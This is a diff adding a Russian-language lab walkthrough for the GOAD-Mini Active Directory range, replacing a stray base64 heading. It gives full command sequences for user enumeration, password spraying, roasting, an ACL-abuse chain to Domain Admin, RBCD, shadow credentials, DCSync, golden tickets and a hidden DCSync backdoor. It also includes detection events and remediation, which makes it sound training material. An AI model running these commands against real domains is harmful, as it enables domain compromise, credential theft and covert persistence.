@@ -1,1 +1,444 @@
-# SGV4YXRlY2h7anNfcGl2b3RfaGludH0=
+# GOAD-Mini — полный вокэраунд
+
+Лаборатория: **GOAD-Mini** (Game of Active Directory, Orange Cyberdefense).
+Объём: одна ВМ, один домен — `sevenkingdoms.local`, контроллер домена `kingslanding` (Windows Server 2019, **Defender включён по умолчанию**).
+Цель: непривилегированный пользователь домена → **Domain Admin** → DCSync, исключительно через злоупотребление ACL. CVE и эксплойты не нужны — вся лаба это цепочка мисконфигураций Active Directory, ровно как на реальных внутренних пентестах.
+
+> Всё ниже — только против вашей собственной лабораторной ВМ. Больше нигде это запускать нельзя.
+
+---
+
+## 0. Карта лаборатории
+
+Домен: `sevenkingdoms.local` · КД: `kingslanding` (DC01)
+
+Локальные админы на КД: `robert.baratheon`, `cersei.lannister`.
+RDP на КД: группа `Small Council`.
+
+Задуманный граф (прямо из официального описания лабы):
+
+| Субъект | Право | Цель |
+|---|---|---|
+| tywin.lannister | ForceChangePassword | jaime.lannister |
+| jaime.lannister | GenericWrite | joffrey.baratheon |
+| joffrey.baratheon | WriteDACL | tyron.lannister |
+| tyron.lannister | Self-membership | группа `Small Council` |
+| Small Council | AddMember | группа `DRAGONSTONE` (+ RDP на КД) |
+| DRAGONSTONE | WriteOwner | группа `KINGSGUARD` |
+| KINGSGUARD | GenericAll | stannis.baratheon |
+| stannis.baratheon | GenericAll | **компьютер** `kingslanding` |
+| stannis.baratheon | WriteProperty self-membership | **Domain Admins** |
+
+Есть также три коротких пути — если ты сразу попал на нужную учётку:
+
+| Субъект | Право | Цель |
+|---|---|---|
+| petyr.baelish | WriteProperty | Domain Admins |
+| lord.varys | GenericAll | Domain Admins |
+| maester.pycelle | WriteOwner | Domain Admins |
+
+То есть до DA ведут по сути **четыре** дороги. Сначала пройди длинную — она обучает всем примитивам ACL.
+
+---
+
+## 1. Развёртывание лаборатории
+
+Клонируем и используем лаунчер `goad` (единый установщик v3):
+
+```bash
+git clone https://github.com/Orange-Cyberdefense/GOAD.git
+cd GOAD
+./goad.sh          # интерактивная консоль
+```
+
+В консоли:
+
+```
+set_lab GOAD-Mini
+set_provider virtualbox      # или vmware / proxmox / ludus / aws / azure
+set_method local             # запускает ansible с твоего хоста
+install
+```
+
+Неинтерактивный эквивалент:
+
+```bash
+./goad.sh -t install -l GOAD-Mini -p virtualbox -m local
+```
+
+Заметки, которые экономят часы:
+
+- GOAD-Mini самая дешёвая лаба (1 ВМ, ~4 ГБ RAM). Используй, когда полный GOAD на 5 ВМ не влезает.
+- Провижининг это Ansible поверх WinRM; если задача упала посреди прогона — просто перезапусти `install`, он идемпотентен. Если падает стабильно → `./goad.sh -t provision -l GOAD-Mini ...`, чтобы пропустить сборку ВМ.
+- Сеть по умолчанию для VirtualBox/VMware — `192.168.56.0/24`, КД обычно `192.168.56.10` (проверь `ad/GOAD-Mini/providers/*/inventory`).
+- Defender **включён**. Инструментарий держи на стороне Linux (NetExec, Impacket, bloodyAD), а не кидай бинарники на КД. Это фича, а не баг — относись как к реальной цели.
+- Сделай снапшот ВМ сразу после провижининга. По ходу цепочки ты сломаешь ACL, и откат к снапшоту гораздо быстрее, чем переустановка.
+
+Атакующая машина (Kali/Parrot или Debian-ВМ в той же host-only сети):
+
+```bash
+pipx install netexec
+pipx install impacket
+pipx install bloodyAD
+pipx install certipy-ad
+pipx install pywhisker
+apt install -y bloodhound-ce python3-bloodhound krb5-user ldap-utils
+```
+
+Настрой резолвинг на КД и Kerberos, чтобы работала аутентификация по имени:
+
+```bash
+echo "192.168.56.10 kingslanding.sevenkingdoms.local kingslanding sevenkingdoms.local" >> /etc/hosts
+cat > /etc/krb5.conf <<'EOF'
+[libdefaults]
+    default_realm = SEVENKINGDOMS.LOCAL
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+[realms]
+    SEVENKINGDOMS.LOCAL = {
+        kdc = kingslanding.sevenkingdoms.local
+        admin_server = kingslanding.sevenkingdoms.local
+    }
+EOF
+```
+
+---
+
+## 2. Разведка — без учётных данных
+
+```bash
+nmap -Pn -sV -p- 192.168.56.10 -oA goadmini
+```
+
+Ожидаемый отпечаток КД: 53, 88 (Kerberos), 135, 139, 389/636 (LDAP/S), 445, 464, 3268/3269 (GC), 3389 (RDP), 5985 (WinRM), 9389 (ADWS), 49152+ (RPC).
+
+Null / guest сессия и базовые факты о домене:
+
+```bash
+nxc smb 192.168.56.10 -u '' -p '' --shares
+nxc smb 192.168.56.10 -u 'guest' -p '' --shares
+nxc smb 192.168.56.10 -u '' -p '' --pass-pol
+nxc ldap 192.168.56.10 -u '' -p '' -M get-desc-users     # в описаниях часто лежат пароли
+```
+
+Анонимный LDAP root DSE (работает даже когда бинды ограничены):
+
+```bash
+ldapsearch -x -H ldap://192.168.56.10 -s base -b '' '(objectClass=*)'
+```
+
+### Собираем список пользователей
+
+Два надёжных способа без учёток:
+
+**RID cycling** (работает, если разрешена guest/null-энумерация):
+
+```bash
+nxc smb 192.168.56.10 -u 'guest' -p '' --rid-brute 5000 | tee rid.txt
+grep SidTypeUser rid.txt | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt
+```
+
+**Kerberos user enumeration** (не требует валидного пароля — KDC сам выдаёт, существует ли принципал):
+
+```bash
+kerbrute userenum -d sevenkingdoms.local --dc 192.168.56.10 names.txt
+```
+
+`names.txt` собери из персонажей Игры престолов в формате `first.last` — это конвенция именования. Либо просто возьми таблицу ACL выше: там девять учёток, которые важны.
+
+### Учётки без пре-аутентификации (AS-REP roasting)
+
+```bash
+nxc ldap 192.168.56.10 -u users.txt -p '' --asreproast asrep.txt
+# или
+impacket-GetNPUsers sevenkingdoms.local/ -usersfile users.txt -dc-ip 192.168.56.10 -request -format hashcat
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+```
+
+### Password spraying
+
+Пароли в лабе тематические и слабые by design (фразы, связанные с персонажами). Собери небольшой словарь из имён персонажей и цитат из Игры престолов, затем спрей — с учётом политики блокировки, которую ты вычитал через `--pass-pol`:
+
+```bash
+nxc smb 192.168.56.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+nxc smb 192.168.56.10 -u users.txt -p users.txt  --no-bruteforce   # логин == пароль
+```
+
+Проверь и классику: пустой пароль, `changeme`, паттерны с сезоном/годом, и собственное имя учётки.
+
+Любое попадание из этого раздела — твой первичный доступ. `tywin.lannister` это каноническая точка входа в длинную цепочку.
+
+---
+
+## 3. Энумерация с валидным пользователем
+
+Проверяем и профилируем учётку:
+
+```bash
+export DC=192.168.56.10 D=sevenkingdoms.local U=tywin.lannister P='<pass>'
+nxc smb $DC -u $U -p "$P"
+nxc smb $DC -u $U -p "$P" --shares --users --groups --pass-pol
+nxc ldap $DC -u $U -p "$P" --trusted-for-delegation --admin-count
+nxc ldap $DC -u $U -p "$P" --kerberoasting kerb.txt
+```
+
+Получаем TGT, чтобы работать в Kerberos (тише и обходит ограничения NTLM):
+
+```bash
+impacket-getTGT $D/$U:"$P" -dc-ip $DC
+export KRB5CCNAME=$U.ccache
+nxc smb kingslanding.sevenkingdoms.local -u $U -k --use-kcache
+```
+
+### BloodHound
+
+Собираем и даём графу подтвердить цепочку, а не верим таблице на слово:
+
+```bash
+bloodhound-python -d $D -u $U -p "$P" -ns $DC -c All --zip
+# или
+nxc ldap $DC -u $U -p "$P" --bloodhound -c All --dns-server $DC
+```
+
+Импортируй zip в BloodHound CE. Пометь все свои учётки как Owned, затем запусти **Shortest Paths to Domain Admins from Owned Principals**. В GOAD-Mini граф достаточно мал, чтобы прочитать его целиком — сделай это, в этом весь смысл лабы.
+
+---
+
+## 4. Цепочка до Domain Admin
+
+Каждый прыжок ниже — отдельный примитив злоупотребления ACL. `bloodyAD` делает их все с Linux через LDAP.
+
+Хелпер:
+
+```bash
+BAD="bloodyAD --host kingslanding.sevenkingdoms.local -d $D --dc-ip $DC"
+```
+
+### Прыжок 1 — tywin.lannister: ForceChangePassword → jaime.lannister
+
+Расширенное право `User-Force-Change-Password` позволяет задать пароль, не зная старого.
+
+```bash
+$BAD -u tywin.lannister -p "$P" set password jaime.lannister 'NewPass123!'
+nxc smb $DC -u jaime.lannister -p 'NewPass123!'
+```
+
+Альтернативы: `net rpc password` (Samba), `Set-DomainUserPassword` (PowerView), `changepasswd.py` (Impacket).
+Учти OPSEC-цену: ты только что залочил реального пользователя. На реальном проекте ты бы зафиксировал право и пошёл дальше, либо восстановил хеш после.
+
+### Прыжок 2 — jaime.lannister: GenericWrite → joffrey.baratheon
+
+`GenericWrite` на пользователе **не** даёт сбросить пароль, но даёт писать атрибуты. Два чистых способа:
+
+**a) Targeted Kerberoast** — пишем SPN, роастим, убираем:
+
+```bash
+$BAD -u jaime.lannister -p 'NewPass123!' set object joffrey.baratheon servicePrincipalName -v 'fake/joffrey'
+impacket-GetUserSPNs $D/jaime.lannister:'NewPass123!' -dc-ip $DC -request-user joffrey.baratheon -outputfile joffrey.kerb
+hashcat -m 13100 joffrey.kerb /usr/share/wordlists/rockyou.txt
+$BAD -u jaime.lannister -p 'NewPass123!' remove object joffrey.baratheon servicePrincipalName
+```
+
+**b) Shadow Credentials** (без крека, работает если у КД есть сертификат KDC — Server 2019 имеет его при наличии CA; иначе используй (a) или (c)):
+
+```bash
+certipy shadow auto -u jaime.lannister@$D -p 'NewPass123!' -account joffrey.baratheon -dc-ip $DC
+```
+
+**c) Targeted AS-REP roast** — ставим флаг `DONT_REQ_PREAUTH`, затем AS-REP-роастим учётку и крекаем:
+
+```bash
+$BAD -u jaime.lannister -p 'NewPass123!' add uac joffrey.baratheon -f DONT_REQ_PREAUTH
+impacket-GetNPUsers $D/ -dc-ip $DC -request-user joffrey.baratheon -format hashcat
+$BAD -u jaime.lannister -p 'NewPass123!' remove uac joffrey.baratheon -f DONT_REQ_PREAUTH
+```
+
+Поскольку пароли из GoT, (a) и (c) крекаются за секунды против `rockyou`.
+
+### Прыжок 3 — joffrey.baratheon: WriteDACL → tyron.lannister
+
+`WriteDACL` означает, что ты можешь выдать себе что угодно. Повышаем до полного контроля и сбрасываем пароль:
+
+```bash
+$BAD -u joffrey.baratheon -p '<pass>' add genericAll tyron.lannister joffrey.baratheon
+$BAD -u joffrey.baratheon -p '<pass>' set password tyron.lannister 'NewPass123!'
+```
+
+(Эквивалент Impacket: `dacledit.py -action write -rights FullControl -principal joffrey.baratheon -target tyron.lannister`.)
+
+### Прыжок 4 — tyron.lannister: Self-membership → Small Council
+
+`WriteProperty` на `member`, ограниченный *самим собой* — добавить можешь только свою учётку:
+
+```bash
+$BAD -u tyron.lannister -p 'NewPass123!' add groupMember 'Small Council' tyron.lannister
+nxc ldap $DC -u tyron.lannister -p 'NewPass123!' --groups | grep -i council
+```
+
+Сразу два выигрыша: у `Small Council` есть **RDP на kingslanding**, и она может добавлять членов в `DRAGONSTONE`.
+
+Заходим по RDP (интерактивный доступ к КД как не-админ — удобно для локальной разведки, поиска кредов в реестре/сессиях и для тестов поведения Defender):
+
+```bash
+xfreerdp3 /v:$DC /u:tyron.lannister /p:'NewPass123!' /d:$D /dynamic-resolution +clipboard
+```
+
+### Прыжок 5 — Small Council: AddMember → DRAGONSTONE
+
+Неограниченный `AddMember`, так что добавляем себя (или контролируемую учётку):
+
+```bash
+$BAD -u tyron.lannister -p 'NewPass123!' add groupMember DRAGONSTONE tyron.lannister
+```
+
+### Прыжок 6 — DRAGONSTONE: WriteOwner → KINGSGUARD
+
+`WriteOwner` = стать владельцем, а владелец неявно имеет `WriteDACL`. Три шага: становимся владельцем, выдаём себе право, вступаем.
+
+```bash
+$BAD -u tyron.lannister -p 'NewPass123!' set owner KINGSGUARD tyron.lannister
+$BAD -u tyron.lannister -p 'NewPass123!' add genericAll KINGSGUARD tyron.lannister
+$BAD -u tyron.lannister -p 'NewPass123!' add groupMember KINGSGUARD tyron.lannister
+```
+
+(Impacket: `owneredit.py -action write -new-owner tyron.lannister -target KINGSGUARD`, затем `dacledit.py`.)
+
+Изменения членства в группе попадают в твой Kerberos-тикет только при **новом** TGT — если работаешь с тикетами, перезапрашивай после каждого изменения членства:
+
+```bash
+kdestroy; impacket-getTGT $D/tyron.lannister:'NewPass123!' -dc-ip $DC
+```
+
+### Прыжок 7 — KINGSGUARD: GenericAll → stannis.baratheon
+
+```bash
+$BAD -u tyron.lannister -p 'NewPass123!' set password stannis.baratheon 'NewPass123!'
+```
+
+### Прыжок 8 — stannis.baratheon → Domain Admin (два способа)
+
+**8a. WriteProperty self-membership на Domain Admins** — прямой путь:
+
+```bash
+$BAD -u stannis.baratheon -p 'NewPass123!' add groupMember 'Domain Admins' stannis.baratheon
+nxc smb $DC -u stannis.baratheon -p 'NewPass123!'      # ожидаем (Pwn3d!)
+```
+
+**8b. GenericAll на объект-компьютер `kingslanding`** — захват КД без изменения членства в группах. Более интересная техника, которую стоит отработать.
+
+*Resource-Based Constrained Delegation (RBCD):* создаём учётку-компьютер (по умолчанию `ms-DS-MachineAccountQuota` = 10), затем говорим КД доверять ей право имперсонировать кого угодно.
+
+```bash
+$BAD -u stannis.baratheon -p 'NewPass123!' add computer evilpc 'EvilPass123!'
+$BAD -u stannis.baratheon -p 'NewPass123!' add rbcd kingslanding$ evilpc$
+
+impacket-getST -spn cifs/kingslanding.sevenkingdoms.local \
+  -impersonate Administrator -dc-ip $DC $D/evilpc$:'EvilPass123!'
+export KRB5CCNAME=Administrator@cifs_kingslanding.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache
+impacket-secretsdump -k -no-pass kingslanding.sevenkingdoms.local
+```
+
+*Shadow Credentials на КД* (альтернатива, без делегирования, без смены пароля):
+
+```bash
+certipy shadow auto -u stannis.baratheon@$D -p 'NewPass123!' -account kingslanding$ -dc-ip $DC
+# → выдаёт NT-хеш / TGT машинной учётки КД, пригодный для DCSync
+```
+
+В любом случае домен теперь твой.
+
+### Короткие пути
+
+Если твоя точка входа — одна из этих учёток, ты сразу прыгаешь в конец:
+
+```bash
+# petyr.baelish — WriteProperty на атрибут member группы
+$BAD -u petyr.baelish -p '<pass>' add groupMember 'Domain Admins' petyr.baelish
+
+# lord.varys — GenericAll на группу
+$BAD -u lord.varys -p '<pass>' add groupMember 'Domain Admins' lord.varys
+
+# maester.pycelle — WriteOwner на группу: стать владельцем → выдать → добавить
+$BAD -u maester.pycelle -p '<pass>' set owner 'Domain Admins' maester.pycelle
+$BAD -u maester.pycelle -p '<pass>' add genericAll 'Domain Admins' maester.pycelle
+$BAD -u maester.pycelle -p '<pass>' add groupMember 'Domain Admins' maester.pycelle
+```
+
+---
+
+## 5. Пост-эксплуатация
+
+DCSync всей директории:
+
+```bash
+impacket-secretsdump $D/stannis.baratheon:'NewPass123!'@$DC -just-dc
+nxc smb $DC -u stannis.baratheon -p 'NewPass123!' --ntds        # LSA/NTDS через NetExec
+```
+
+Шелл на КД:
+
+```bash
+nxc smb $DC -u stannis.baratheon -p 'NewPass123!' -x 'whoami /all'
+impacket-psexec  $D/stannis.baratheon:'NewPass123!'@$DC
+impacket-wmiexec $D/stannis.baratheon:'NewPass123!'@$DC        # тише, без создания службы
+evil-winrm -i $DC -u stannis.baratheon -p 'NewPass123!'
+```
+
+Упражнения на закрепление, которые стоит проделать один раз, раз это лаба:
+
+```bash
+# Golden ticket из хеша krbtgt
+impacket-ticketer -nthash <krbtgt_nt> -domain-sid <S-1-5-21-...> -domain $D Administrator
+
+# Pass-the-hash как встроенный админ
+nxc smb $DC -u Administrator -H <admin_nt_hash>
+
+# Права DCSync, выданные непривилегированной учётке (скрытый бэкдор — потом поищи его сам)
+$BAD -u stannis.baratheon -p 'NewPass123!' add dcsync tywin.lannister
+```
+
+Учти, что Defender включён: `psexec` и сброшенные PE-файлы часто ловятся, тогда как `wmiexec`, LDAP-only инструменты и Kerberos-доступ в основном проходят. Сравнение того, что триггерит, а что нет — самое полезное, чему учит эта лаба помимо графа.
+
+---
+
+## 6. Как каждый прыжок выглядит для защитника
+
+Пройди цепочку дважды — один раз вслепую, второй с подключённым расширением ELK или Wazuh из GOAD — и скоррелируй:
+
+| Шаг атаки | Основная телеметрия |
+|---|---|
+| RID cycling / null LDAP | 4625, 5145, SAMR-запросы; высокий объём LDAP-биндов с одного источника |
+| Kerberos user enum | 4768 с кодом ошибки `0x6` (принципал неизвестен) сериями |
+| AS-REP roast | 4768 с `Pre-Auth Type: 0`, тип шифрования 23 |
+| Kerberoast | 4769 для нестандартного SPN, запрошен RC4 (`0x17`) |
+| Сброс пароля через ACL | **4724** (попытка сброса) без соответствующего процесса helpdesk |
+| Изменение ACL / DACL | **5136** на `nTSecurityDescriptor` — самое ценное событие тут |
+| Смена владельца | 5136 на SD, изменение поля owner |
+| Добавление в группу | **4728 / 4732 / 4756** — особенно на Domain Admins |
+| Создание учётки-компьютера | **4741**, `MachineAccountQuota` израсходован пользовательской учёткой |
+| RBCD | 5136 на `msDS-AllowedToActOnBehalfOfOtherIdentity` |
+| Shadow credentials | 5136 на `msDS-KeyCredentialLink` |
+| DCSync | **4662** с GUID DS-Replication-Get-Changes от не-КД принципала |
+
+История ремедиации такая же короткая: снять эти ACE, поставить привилегированные группы под контроль изменений и алертинг на 5136/4728, задать `ms-DS-MachineAccountQuota` = 0, ввести нормальную парольную политику и требовать пре-аутентификацию везде.
+
+---
+
+## 7. Сброс и повтор
+
+```bash
+./goad.sh -t destroy -l GOAD-Mini -p virtualbox        # снести
+vagrant snapshot restore GOAD-Mini-DC01 clean          # или просто откатись к снапшоту
+```
+
+Затем расширяй — GOAD-Mini и существует как минимальная база под расширения. Стоит навесить: `ws01` (рабочая станция — открывает локальный привесc и латеральное движение), `elk` или `wazuh` (детект-инжиниринг), `guacamole` (доступ из браузера), и лабы с уклоном в ADCS/SCCM, когда захочешь пути атак через сертификаты и SCCM.
+
+---
+
+## Источники
+
+- [Документация лабы GOAD-Mini](https://orange-cyberdefense.github.io/GOAD/labs/GOAD-Mini/) — каноническая таблица пользователей/ACL, использованная выше
+- [Репозиторий GOAD](https://github.com/Orange-Cyberdefense/GOAD)
+- [Инструкции по установке GOAD](https://orange-cyberdefense.github.io/GOAD/installation/) и [провайдеры](https://orange-cyberdefense.github.io/GOAD/providers/)
+- [Серия вокэраундов GOAD от Mayfly](https://mayfly277.github.io/categories/goad/) — самые глубокие опубликованные разборы; GOAD-Mini это подмножество глав про sevenkingdoms, поэтому [часть 2 (поиск пользователей)](https://mayfly277.github.io/posts/GOADv2-pwning-part2/) и [часть 3 (энумерация с пользователем)](https://mayfly277.github.io/posts/GOADv2-pwning-part3/) ложатся почти напрямую
+- [bloodyAD](https://github.com/CravateRouge/bloodyAD) · [NetExec](https://www.netexec.wiki/) · [Certipy](https://github.com/ly4k/Certipy) · [The Hacker Recipes — AD](https://www.thehacker.recipes/ad/movement/dacl)
